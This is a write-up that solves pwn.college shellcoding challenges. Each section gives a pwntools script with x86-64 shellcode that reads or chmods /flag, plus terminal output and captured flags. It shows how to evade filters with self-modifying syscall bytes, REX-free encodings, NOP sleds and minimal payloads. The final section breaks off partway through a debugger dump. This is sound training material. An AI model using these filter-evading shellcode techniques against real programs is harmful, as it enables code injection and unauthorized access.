---
custom_edit_url: null
sidebar_position: 1
slug: /pwn-college/program-security/program-security-shellcoding
---

## ello ackers!

```
hacker@program-security~ello-ackers:/$ /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.
```

Let's create our exploit script.

### Exploit

```py title="~/script" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea rdi, [rip + flag]
    xor esi, esi
    xor rdx, rdx
    mov rax, 2           
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov rdi, 1          
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x100
    mov rax, 40          
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60            
    syscall

flag:
    .string "/flag"
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~ello-ackers:/$ python ~/script.py | /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.

   0:   48 8d 3d 3b 00 00 00    lea    rdi, [rip+0x3b]        # 0x42
   7:   31 f6                   xor    esi, esi
   9:   48 31 d2                xor    rdx, rdx
   c:   48 c7 c0 02 00 00 00    mov    rax, 0x2
  13:   0f 05                   syscall 
  15:   48 c7 c7 01 00 00 00    mov    rdi, 0x1
  1c:   48 89 c6                mov    rsi, rax
  1f:   48 c7 c2 00 00 00 00    mov    rdx, 0x0
  26:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  2d:   48 c7 c0 28 00 00 00    mov    rax, 0x28
  34:   0f 05                   syscall 
  36:   48 31 ff                xor    rdi, rdi
  39:   48 c7 c0 3c 00 00 00    mov    rax, 0x3c
  40:   0f 05                   syscall 
  42:   2f                      (bad)  
  43:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  45:   61                      (bad)  
  46:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode have no H bytes!

Failed filter at byte 0!
```

We can see that the program requires that our shell code has no [`REX.W prefix`](https://en.wikipedia.org/wiki/REX_prefix).

```
## REX:
0100 W R X B

## REX.W:
0100 1000   =>   0x48
```

A `REX.W` prefix is used to denote when an instruction uses 64-bit operands.

#### Without `REX.W` prefix

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
    syscall

    /* exit(0) */
    xor edi, edi
    mov al, 60
    syscall

flag:
    .string "/flag" 
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~ello-ackers:/$ python ~/script.py | /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.

   0:   8d 3d 2b 00 00 00       lea    edi, [rip+0x2b]        # 0x31
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   0f 05                   syscall 
  11:   bf 01 00 00 00          mov    edi, 0x1
  16:   89 c6                   mov    esi, eax
  18:   ba 00 00 00 00          mov    edx, 0x0
  1d:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  24:   b8 28 00 00 00          mov    eax, 0x28
  29:   0f 05                   syscall 
  2b:   31 ff                   xor    edi, edi
  2d:   b0 3c                   mov    al, 0x3c
  2f:   0f 05                   syscall 
  31:   2f                      (bad)  
  32:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  34:   61                      (bad)  
  35:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000026e33000 | 8d 3d 2b 00 00 00                             | lea edi, [rip + 0x2b]
0x0000000026e33006 | 31 f6                                         | xor esi, esi
0x0000000026e33008 | 31 d2                                         | xor edx, edx
0x0000000026e3300a | b8 02 00 00 00                                | mov eax, 2
0x0000000026e3300f | 0f 05                                         | syscall 
0x0000000026e33011 | bf 01 00 00 00                                | mov edi, 1
0x0000000026e33016 | 89 c6                                         | mov esi, eax
0x0000000026e33018 | ba 00 00 00 00                                | mov edx, 0
0x0000000026e3301d | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000026e33024 | b8 28 00 00 00                                | mov eax, 0x28
0x0000000026e33029 | 0f 05                                         | syscall 
0x0000000026e3302b | 31 ff                                         | xor edi, edi
0x0000000026e3302d | b0 3c                                         | mov al, 0x3c
0x0000000026e3302f | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{Y0AomWBAdnyjKxZlzES4hSXCoU-.0FMyIDL4ITM0EzW}
```

&nbsp;

## Syscall Smuggler

```
hacker@program-security~syscall-smuggler:/$ /challenge/syscall-smuggler 
###
### Welcome to /challenge/syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x286d6000!
Reading 0x1000 bytes from stdin.
```

We will have to create a self-modifying shellcode which will bypass the filters.
For this, we have to create a label that has the bytes, `0x0e` and `0x04`. 

```asm showLineNumbers
sys1:
    .byte 0x0e
    .byte 0x04
```

Before this label is executed, we have to increment the byte values so that they are `0x0f` and `0x05` which is the bytecode for `syscall`.
Our modifications should look something like this:

```asm title="syscall snippet" showLineNumbers
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]

sys1:
    .byte 0x0e
    .byte 0x04
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    
    /* syscall */
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]
sys1:
    .byte 0x0e
    .byte 0x04        

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
 
    /* syscall */
    inc byte ptr [rip + sys2 + 1]
    inc byte ptr [rip + sys2]
sys2:
    .byte 0x0e
    .byte 0x04            

    /* exit(0) */
    xor edi, edi
    mov al, 60

    /* syscall */
    inc byte ptr [rip + sys3 + 1]
    inc byte ptr [rip + sys3]
sys3:
    .byte 0x0e
    .byte 0x04           

flag:
    .string "/flag" 
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~syscall-smuggler:/$ python ~/script.py | /challenge/syscall-smuggler 
###
### Welcome to /challenge/syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x286d6000!
Reading 0x1000 bytes from stdin.

   0:   8d 3d 4f 00 00 00       lea    edi, [rip+0x4f]        # 0x55
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x1c
  15:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x1b
  1b:   0e                      (bad)  
  1c:   04 bf                   add    al, 0xbf
  1e:   01 00                   add    DWORD PTR [rax], eax
  20:   00 00                   add    BYTE PTR [rax], al
  22:   89 c6                   mov    esi, eax
  24:   ba 00 00 00 00          mov    edx, 0x0
  29:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  30:   b8 28 00 00 00          mov    eax, 0x28
  35:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x42
  3b:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x41
  41:   0e                      (bad)  
  42:   04 31                   add    al, 0x31
  44:   ff b0 3c fe 05 07       push   QWORD PTR [rax+0x705fe3c]
  4a:   00 00                   add    BYTE PTR [rax], al
  4c:   00 fe                   add    dh, bh
  4e:   05 00 00 00 00          add    eax, 0x0
  53:   0e                      (bad)  
  54:   04 2f                   add    al, 0x2f
  56:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  58:   61                      (bad)  
  59:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00000000286d6000 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
0x00000000286d6006 | 31 f6                                         | xor esi, esi
0x00000000286d6008 | 31 d2                                         | xor edx, edx
0x00000000286d600a | b8 02 00 00 00                                | mov eax, 2
0x00000000286d600f | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
0x00000000286d6015 | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

pwn.college{4rDXk944HRYc-LzoHZ_apv9MDgT.0VMyIDL4ITM0EzW}
```

&nbsp;

## Syscall Shenanigans

```
hacker@program-security~syscall-shenanigans:/$ /challenge/syscall-shenanigans 
###
### Welcome to /challenge/syscall-shenanigans!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x2000 bytes for shellcode at 0x2b033000!
Reading 0x2000 bytes from stdin.
```

If we try the exploit from the previous challenge, we get the following message:

```
hacker@program-security~syscall-shenanigans:/$ python ~/script.py | /challenge/syscall-shenanigans 
###
### Welcome to /challenge/syscall-shenanigans!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x2000 bytes for shellcode at 0x2b033000!
Reading 0x2000 bytes from stdin.

   0:   8d 3d 4f 00 00 00       lea    edi, [rip+0x4f]        # 0x55
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x1c
  15:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x1b
  1b:   0e                      (bad)  
  1c:   04 bf                   add    al, 0xbf
  1e:   01 00                   add    DWORD PTR [rax], eax
  20:   00 00                   add    BYTE PTR [rax], al
  22:   89 c6                   mov    esi, eax
  24:   ba 00 00 00 00          mov    edx, 0x0
  29:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  30:   b8 28 00 00 00          mov    eax, 0x28
  35:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x42
  3b:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x41
  41:   0e                      (bad)  
  42:   04 31                   add    al, 0x31
  44:   ff b0 3c fe 05 07       push   QWORD PTR [rax+0x705fe3c]
  4a:   00 00                   add    BYTE PTR [rax], al
  4c:   00 fe                   add    dh, bh
  4e:   05 00 00 00 00          add    eax, 0x0
  53:   0e                      (bad)  
  54:   04 2f                   add    al, 0x2f
  56:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  58:   61                      (bad)  
  59:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000002b033000 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
0x000000002b033006 | 31 f6                                         | xor esi, esi
0x000000002b033008 | 31 d2                                         | xor edx, edx
0x000000002b03300a | b8 02 00 00 00                                | mov eax, 2
0x000000002b03300f | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
0x000000002b033015 | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

Segmentation fault
```

Since the first 4096 bytes will be non-writable, we will have to pad that range with a NOP sled.

### NOP sled

#### `nop` instruction

The `nop` instruction makes no semantic difference to the program, i.e. it does nothing to the program logic. For this reason, it can be used to pad the code.

We can repeat the `nop` instruction using a `repeat` loop.

#### `rept` instruction

The `rept` instruction creates a loop repeats which whatever instruction is mentioned within it as many times as specified.

```
.rept (number of times to be repeated)
instruction
.endr
```

Now we simply have to put our `nop` instruction inside the repeat loop and put the repeat loop between the `jmp` instruction and the label.

```
jmp Relative
.rept 4096
nop
.endr
Relative:
mov rax, 0x1
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    
    /* syscall */
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]
sys1:
    .byte 0x0e
    .byte 0x04        

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
 
    /* syscall */
    inc byte ptr [rip + sys2 + 1]
    inc byte ptr [rip + sys2]
sys2:
    .byte 0x0e
    .byte 0x04            

    /* exit(0) */
    xor edi, edi
    mov al, 60

    /* syscall */
    inc byte ptr [rip + sys3 + 1]
    inc byte ptr [rip + sys3]
sys3:
    .byte 0x0e
    .byte 0x04           

flag:
    .string "/flag" 
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~syscall-shenanigans:/$ python ~/script.py | /challenge/syscall-shenanigans 

# ---- snip ----

0x000000002b034003 | 90                                            | nop 
0x000000002b034004 | 90                                            | nop 
0x000000002b034005 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
0x000000002b03400b | 31 f6                                         | xor esi, esi
0x000000002b03400d | 31 d2                                         | xor edx, edx
0x000000002b03400f | b8 02 00 00 00                                | mov eax, 2
0x000000002b034014 | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
0x000000002b03401a | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

pwn.college{ExWjiR3WDqi0KdvDkYToGHFiGhQ.0lMyIDL4ITM0EzW}
```

&nbsp;

## Byte Budget

```
hacker@program-security~byte-budget:/$ /challenge/byte-budget 
###
### Welcome to /challenge/byte-budget!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x2e0a9000!
Reading 0x12 bytes from stdin.
```

We only get 18 bytes to fit our shellcode into.

We can do a `chmod` syscall and change the permissions of the flag file.

### `chmod` syscall

| %rax | arg0 (%rdi)          | arg1 (%rsi)    | 
| :--- | :------------------- | :------------- | 
| 0x5a | const char *filename | umode_t mode   |

The first argument is a pointer to the `filename`, and the second argument is the `mode` which for us would be 0777 or `0x1ff`.

If we were to push `/flag` onto the stack and pop it's pointer into `rdi`, it would take too many bytes.
This is where we can utilize [symlinks](https://en.wikipedia.org/wiki/Symbolic_link).

### Symbolic linking

Creating a symbolic link of `/flag` would allow us to access it by accessing the symlink. As the symlink is entirely under our control, we can set whatever name for it.

The identifier of the `chmod` syscall is `0x5a`, which happens to be `Z` in ASCII. If we name the synlink `Z`, we can store the value and the pointer both, in the relevant registers, `rax` and `rdi` respectively.

```
hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
   /* chmod("Z", 0777) */
   push 0x5a
   push rsp
   pop rdi
   pop rax
   mov si, 0x1ff
	syscall
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~byte-budget:~$ python ~/script.py | /challenge/byte-budget
###
### Welcome to /challenge/byte-budget!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x2e0a9000!
Reading 0x12 bytes from stdin.

   0:   6a 5a                   push   0x5a
   2:   54                      push   rsp
   3:   5f                      pop    rdi
   4:   58                      pop    rax
   5:   66 be ff 01             mov    si, 0x1ff
   9:   0f 05                   syscall
Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000002e0a9000 | 6a 5a                                         | push 0x5a
0x000000002e0a9002 | 54                                            | push rsp
0x000000002e0a9003 | 5f                                            | pop rdi
0x000000002e0a9004 | 58                                            | pop rax
0x000000002e0a9005 | 66 be ff 01                                   | mov si, 0x1ff
0x000000002e0a9009 | 0f 05                                         | syscall 

Executing shellcode!

Segmentation fault
```

The Segfault happens after our `chmod` syscall is executed.

```
hacker@program-security~byte-budget:~$ cat ~/Z
pwn.college{04NuaC8j3tSCz0WmiNt4s7uTBXZ.0FNyIDL4ITM0EzW}
```

&nbsp;

## ClobberCode

```
hacker@program-security~clobbercode:/$ /challenge/clobbercode 
###
### Welcome to /challenge/clobbercode!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x290ad000!
Reading 0x1000 bytes from stdin.
```

In order to not have our shellcode clobbered, we have to fit it within 10 bytes.

```asm
5:   66 be ff 01             mov    si, 0x1ff
```

Previously, our instruction to move the `mode=0x1ff` argument in `chmod` took 4 bytes. However, we don't actually need `mode=0x1ff`, we could work with `mode=0x4` which allows read for all.

### Exploit

```
hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
   /* chmod("z", 0004) */
   push 0x5a
   push rsp
   pop rdi
   pop rax
   mov sil, 0x4
   syscall
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~clobbercode:~$ python ~/script.py | /challenge/clobbercode 
###
### Welcome to /challenge/clobbercode!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x290ad000!
Reading 0x1000 bytes from stdin.

   0:   6a 5a                   push   0x5a
   2:   54                      push   rsp
   3:   5f                      pop    rdi
   4:   58                      pop    rax
   5:   40 b6 04                mov    sil, 0x4
   8:   0f 05                   syscall
Executing filter...

This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your
shellcode.

Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00000000290ad000 | 6a 5a                                         | push 0x5a
0x00000000290ad002 | 54                                            | push rsp
0x00000000290ad003 | 5f                                            | pop rdi
0x00000000290ad004 | 58                                            | pop rax
0x00000000290ad005 | 40 b6 04                                      | mov sil, 4
0x00000000290ad008 | 0f 05                                         | syscall 

Executing shellcode!

Segmentation fault
```

```
hacker@program-security~clobbercode:~$ cat ~/Z
pwn.college{kXvp9dNmYI77jNHDW9Cbj7V6ClS.0VNyIDL4ITM0EzW}
```

&nbsp;

## Diverse Delivery

```
hacker@program-security~diverse-delivery:/$ /challenge/diverse-delivery 
###
### Welcome to /challenge/diverse-delivery!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x22f00000!
Reading 0x1000 bytes from stdin.
```

Since our shellcode from the [Clobbercode](#clobbercode) challenge, had all unique bytes, it should work here.

### Exploit

```
hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
   /* chmod("z", 0004) */
   push 0x5a
   push rsp
   pop rdi
   pop rax
   mov sil, 0x4
   syscall
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~diverse-delivery:~$ python ~/script.py | /challenge/diverse-delivery 
###
### Welcome to /challenge/diverse-delivery!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x22f00000!
Reading 0x1000 bytes from stdin.

   0:   6a 5a                   push   0x5a
   2:   54                      push   rsp
   3:   5f                      pop    rdi
   4:   58                      pop    rax
   5:   40 b6 04                mov    sil, 0x4
   8:   0f 05                   syscall
Executing filter...

This challenge requires that every byte in your shellcode is unique!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000022f00000 | 6a 5a                                         | push 0x5a
0x0000000022f00002 | 54                                            | push rsp
0x0000000022f00003 | 5f                                            | pop rdi
0x0000000022f00004 | 58                                            | pop rax
0x0000000022f00005 | 40 b6 04                                      | mov sil, 4
0x0000000022f00008 | 0f 05                                         | syscall 

Executing shellcode!

Segmentation fault
```

```
hacker@program-security~diverse-delivery:~$ cat ~/Z
pwn.college{A3YYHPRU8SL_mu2vpUotvV6C-U3.0FOyIDL4ITM0EzW}
```

&nbsp;

## Pocket Payload

```
hacker@program-security~pocket-payload:/$ /challenge/pocket-payload 
###
### Welcome to /challenge/pocket-payload!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x15233000!
Reading 0xc bytes from stdin.
```

Again, since our shellcode from [Clobbercode](#clobbercode) was 10 bytes only, it should work here.

### Exploit

```
hacker@program-security~byte-budget:/$ ln -sf /flag ~/Z
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
   /* chmod("z", 0004) */
   push 0x5a
   push rsp
   pop rdi
   pop rax
   mov sil, 0x4
   syscall
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~pocket-payload:~$ python ~/script.py | /challenge/pocket-payload 
###
### Welcome to /challenge/pocket-payload!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x15233000!
Reading 0xc bytes from stdin.

   0:   6a 5a                   push   0x5a
   2:   54                      push   rsp
   3:   5f                      pop    rdi
   4:   58                      pop    rax
   5:   40 b6 04                mov    sil, 0x4
   8:   0f 05                   syscall
Removing write permissions from first 4096 bytes of shellcode.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000015233000 | 6a 5a                                         | push 0x5a
0x0000000015233002 | 54                                            | push rsp
0x0000000015233003 | 5f                                            | pop rdi
0x0000000015233004 | 58                                            | pop rax
0x0000000015233005 | 40 b6 04                                      | mov sil, 4
0x0000000015233008 | 0f 05                                         | syscall 

Executing shellcode!

Segmentation fault
```

```
hacker@program-security~pocket-payload:~$ cat ~/Z
pwn.college{kwjklfeOh4LdJaEQD1NDoUm9jr7.0VOyIDL4ITM0EzW}
```

&nbsp;

## Micro Menace

```
hacker@program-security~micro-menace:/$ /challenge/micro-menace 
###
### Welcome to /challenge/micro-menace!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x2a047000!
Reading 0x6 bytes from stdin.
```

```
───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────
 RAX  0
 RBX  0x5c48118237e0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7bbac5b94297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x2a047000 ◂— 0xcc
 RDI  0x7bbac5c747e0 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x7bbac5c73723 (_IO_2_1_stdout_+131) ◂— 0xc747e0000000000a /* '\n' */
 R8   0x16
 R9   9
 R10  0x5c4811824113 ◂— 0x525245000000000a /* '\n' */
 R11  0x246
 R12  0x5c4811823200 (_start) ◂— endbr64 
 R13  0x7fff21d935c0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff21d934d0 ◂— 0
 RSP  0x7fff21d93488 —▸ 0x5c48118237c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
 RIP  0x2a047001 ◂— 0
────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0x2a047001    add    byte ptr [rax], al
   0x2a047003    add    byte ptr [rax], al
   0x2a047005    add    byte ptr [rax], al
   0x2a047007    add    byte ptr [rax], al
   0x2a047009    add    byte ptr [rax], al
   0x2a04700b    add    byte ptr [rax], al
   0x2a04700d    add    byte ptr [rax], al
   0x2a04700f    add    byte ptr [rax], al
   0x2a047011    add    byte ptr [rax], al
   0x2a047013    add    byte ptr [rax], al
   0x2a047015    add    byte ptr [rax], al
──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff21d93488 —▸ 0x5c48118237c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
01:0008│-040 0x7fff21d93490 —▸ 0x7fff21d934b6 ◂— 0x2710118232000000
02:0010│-038 0x7fff21d93498 —▸ 0x7fff21d935d8 —▸ 0x7fff21d94690 ◂— 0
